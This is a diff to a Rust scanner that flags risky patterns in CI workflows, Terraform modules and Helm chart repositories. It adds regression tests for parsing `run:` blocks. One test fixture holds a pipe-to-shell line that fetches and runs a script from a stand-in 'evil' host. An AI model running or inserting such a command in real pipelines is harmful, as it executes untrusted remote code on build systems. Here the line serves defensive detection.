@@ -34,6 +34,20 @@
 //!    dangerous command (pipe-to-shell, obfuscated payload, …).
 //!    A lifecycle hook runs automatically on `npm install`.
 //!
+//! This module also scans two more repo-infrastructure file shapes. Both reuse
+//! the `RuleId`s the `install.rs` command-line rules already define — a remote
+//! module / chart is the same risk class whether it is named on a command line
+//! or declared in a checked-in file:
+//!
+//!  - **Terraform `module` blocks** — a `module "<name>" { source = … }` whose
+//!    `source` is a remote / untrusted location (a `git::` / `http(s)://`
+//!    address, a `github.com/…` shorthand, a cloud bucket) rather than a local
+//!    path or the Terraform Registry. Fires `RuleId::TerraformRemoteModule`.
+//!  - **Helm chart dependency repos** — a `Chart.yaml` / `requirements.yaml`
+//!    dependency whose `repository:` points at an http(s) / `oci://` chart
+//!    repository that is not a recognised, trusted host. Fires
+//!    `RuleId::HelmUntrustedRepo`.
+//!
 //! Detection is pure pattern matching — no network, no registry lookups.
 //! Every function here is total: a malformed file yields no findings, never a
 //! panic.
@@ -453,6 +467,28 @@ fn line_has_curl_pipe_shell(line: &str) -> bool {
     )
 }
 
+/// The sibling YAML keys of a workflow *step* that can appear next to `run:`.
+/// When a `run: |` block scalar is written on the `- ` list-marker line, the
+/// `run:` key sits at the dash indent, so a sibling block (`env:`, `with:`, …)
+/// of the *same step* is indented *deeper* than the dash — a pure indent test
+/// would wrongly keep scanning it as `run:` body. Treating any of these keys
+/// as a hard block terminator closes that gap (a step's shell body never
+/// contains a bare `env:` / `uses:` line at the start of a physical line).
+const STEP_SIBLING_KEYS: &[&str] = &["env:", "with:", "name:", "if:", "id:", "uses:", "run:"];
+
+/// Whether `trimmed` (an already-`trim`-ed line) begins a sibling step key —
+/// `env:`, `with:`, `name:`, `if:`, `id:`, `uses:`, or another `run:`. Matches
+/// either the bare key on its own line (`env:`) or the key followed by a
+/// value (`env: production`); the trailing `:` is part of the match so an
+/// ordinary `run:`-body command (`ifconfig`, `idle …`) is never mistaken for
+/// a key. The list-item form (`- env:`) is also accepted.
+fn is_step_sibling_key(trimmed: &str) -> bool {
+    let key = trimmed.strip_prefix("- ").unwrap_or(trimmed);
+    STEP_SIBLING_KEYS
+        .iter()
+        .any(|k| key == *k || key.starts_with(k))
+}
+
 /// Scan a workflow's `run:` steps for a pipe-to-shell and for untrusted-input
 /// interpolation. A `run:` block in YAML can be a single line or a `|`/`>`
 /// block scalar; this scans every physical line and only counts a line as a
@@ -460,7 +496,12 @@ fn line_has_curl_pipe_shell(line: &str) -> bool {
 /// itself, or an indented continuation line).
 fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
     let mut in_run_block = false;
-    let mut run_block_indent = 0usize;
+    // The column at which the `run` *key* itself starts — the content after a
+    // `- ` list marker, not the dash. For `      - run: |` this is 8, not 6;
+    // the block body must be indented strictly deeper than this, and a sibling
+    // `env:` of the same step (indented to the key column or shallower) ends
+    // the block.
+    let mut run_key_col = 0usize;
     let mut curl_pipe_evidence: Option<String> = None;
     let mut untrusted_evidence: Option<(String, String)> = None;
 
@@ -476,6 +517,13 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
 
         if let Some(inline) = run_inline {
             let inline = inline.trim();
+            // The column of the `run` key: when the step is written
+            // `- run: …`, the `run` key sits two columns past the dash.
+            let key_col = if trimmed.starts_with("- ") {
+                indent + 2
+            } else {
+                indent
+            };
             // A block scalar (`run: |` / `run: >`) — the body is the following
             // more-indented lines. Strip a trailing YAML comment first:
             // `run: | # deploy step` is valid YAML, and without stripping the
@@ -494,7 +542,7 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
                 || inline_code.starts_with(">+")
             {
                 in_run_block = true;
-                run_block_indent = indent;
+                run_key_col = key_col;
                 continue;
             }
             // A single-line `run:` — scan just this line.
@@ -504,9 +552,14 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
         }
 
         if in_run_block {
-            // The block ends at the first line indented at or below the `run:`
-            // key (a blank line stays inside the block).
-            if !trimmed.is_empty() && indent <= run_block_indent {
+            // The block ends at the first non-blank line indented at or below
+            // the `run` *key* column, or at the first sibling step key
+            // (`env:` / `with:` / `name:` / `if:` / `id:` / `uses:` of the
+            // same step — these are always shallower than or equal to the key
+            // column when the step is written `- run: |`, but a defensive key
+            // match closes the case regardless of exact indentation). A blank
+            // line stays inside the block.
+            if !trimmed.is_empty() && (indent <= run_key_col || is_step_sibling_key(trimmed)) {
                 in_run_block = false;
             } else if !trimmed.is_empty() {
                 scan_run_line(trimmed, &mut curl_pipe_evidence, &mut untrusted_evidence);
@@ -1457,6 +1510,81 @@ mod tests {
             ".github/workflows/ci.yml",
             RuleId::WorkflowUntrustedInput
         ));
+    }
+
+    #[test]
+    fn workflow_run_block_on_dash_line_then_sibling_env_clean() {
+        // F1 regression: a `run: |` block scalar written on the `- ` list-marker
+        // line puts the `run:` key two columns past the dash. The sibling `env:`
+        // of the SAME step is indented to the `run` key column (deeper than the
+        // dash), and its `${{ github.event.* }}` value must NOT be scanned as
+        // `run:` body — the workflow is correctly hardened (the untrusted value
+        // is passed through `env:`, never interpolated into the script).
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
+                  echo \"$TITLE\"\n        env:\n          \
+                  TITLE: ${{ github.event.issue.title }}\n";
+        assert!(
+            !has(
+                wf,
+                ".github/workflows/ci.yml",
+                RuleId::WorkflowUntrustedInput
+            ),
+            "a hardened env-passthrough next to a `- run: |` block must not fire"
+        );
+    }
+
+    #[test]
+    fn workflow_run_block_on_dash_line_then_sibling_with_clean() {
+        // F1 regression (the `with:` sibling variant): a `with:` block of the
+        // same step as a `- run: |` is not a shell sink and must not be scanned.
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
+                  echo done\n        with:\n          \
+                  ref: ${{ github.event.pull_request.head.ref }}\n";
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowUntrustedInput
+        ));
+    }
+
+    #[test]
+    fn workflow_run_block_on_dash_line_genuine_body_still_flagged() {
+        // F1 must NOT weaken real detection: an untrusted expression interpolated
+        // INSIDE the `- run: |` body (not in a sibling key) still fires.
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
+                  echo \"${{ github.event.issue.title }}\"\n        \
+                  env:\n          SAFE: static\n";
+        assert!(
+            has(
+                wf,
+                ".github/workflows/ci.yml",
+                RuleId::WorkflowUntrustedInput
+            ),
+            "untrusted input in the run body itself must still be detected"
+        );
+    }
+
+    #[test]
+    fn workflow_run_block_on_dash_line_curl_pipe_in_body_still_flagged() {
+        // F1 must NOT weaken real detection: a curl|bash inside a `- run: |`
+        // body still fires even with a sibling `env:` after it.
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
+                  curl https://evil.example.com/x.sh | bash\n        \
+                  env:\n          FOO: ${{ github.event.issue.title }}\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+        // ...and the sibling env value is NOT scanned as run body.
+        assert!(
+            !has(
+                wf,
+                ".github/workflows/ci.yml",
+                RuleId::WorkflowUntrustedInput
+            ),
+            "the sibling env: of a `- run: |` step is not a shell sink"
+        );
     }
 
     // --- Dockerfile -------------------------------------------------------
